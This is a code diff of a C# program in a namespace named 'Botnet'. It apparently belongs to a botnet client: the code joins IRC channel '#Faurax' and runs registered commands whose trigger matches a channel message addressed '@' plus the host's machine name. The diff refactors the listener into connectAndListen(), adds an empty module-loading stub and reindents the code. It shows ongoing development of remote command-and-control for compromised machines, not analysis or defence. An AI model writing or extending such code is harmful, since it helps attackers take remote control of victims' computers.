@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -43,27 +44,38 @@ namespace Botnet
 
         static void Main(string[] args)
         {
+            connectAndListen();
+        }
+
+        public static void loadUpModules()
+        {
+
+        }
+
+        public static void connectAndListen()
+        {
             getCommandManager().setup();
             getInstance().getClient().ConnectionComplete += (s, e) => getInstance().getClient().JoinChannel("#Faurax");
             getInstance().getClient().ChannelMessageRecieved += (s, e) =>
             {
-                if (e.PrivateMessage.Message.StartsWith("@") && e.PrivateMessage.Message.Substring(1).Split(' ')[0].Equals(System.Environment.MachineName)) { 
-                Console.WriteLine("Received message \"" + e.PrivateMessage.Message + "\" from " + e.PrivateMessage.User.Nick);
-                String[] arguments = e.PrivateMessage.Message.Substring(3 + System.Environment.MachineName.Length ).Split(' ');
-                var channel = Program.getInstance().getClient().Channels[e.PrivateMessage.Source];
-                foreach (var Command in getCommandManager().getCommands())
+                if (e.PrivateMessage.Message.StartsWith("@") && e.PrivateMessage.Message.Substring(1).Split(' ')[0].Equals(System.Environment.MachineName))
                 {
-                    Console.WriteLine("Checking " + Command.getCatalyst() + " against " + arguments[0] + " with a size of " + arguments.Length);
-                    Console.WriteLine("Trying to execute command : " + Command.getCatalyst());
-                    if (String.Equals(Command.getCatalyst(), arguments[0]))
+                    Console.WriteLine("Received message \"" + e.PrivateMessage.Message + "\" from " + e.PrivateMessage.User.Nick);
+                    String[] arguments = e.PrivateMessage.Message.Substring(3 + System.Environment.MachineName.Length).Split(' ');
+                    var channel = Program.getInstance().getClient().Channels[e.PrivateMessage.Source];
+                    foreach (var Command in getCommandManager().getCommands())
                     {
-                        Console.WriteLine("Successfull evaluation of command " + Command.ToString());
-                        Command.execute(e.PrivateMessage.User, arguments, channel);
-                        break;
+                        Console.WriteLine("Checking " + Command.getCatalyst() + " against " + arguments[0] + " with a size of " + arguments.Length);
+                        Console.WriteLine("Trying to execute command : " + Command.getCatalyst());
+                        if (String.Equals(Command.getCatalyst(), arguments[0]))
+                        {
+                            Console.WriteLine("Successfull evaluation of command " + Command.ToString());
+                            Command.execute(e.PrivateMessage.User, arguments, channel);
+                            break;
+                        }
+                        continue;
                     }
-                    continue;
                 }
-            }
             };
 
             getInstance().getClient().ConnectAsync();
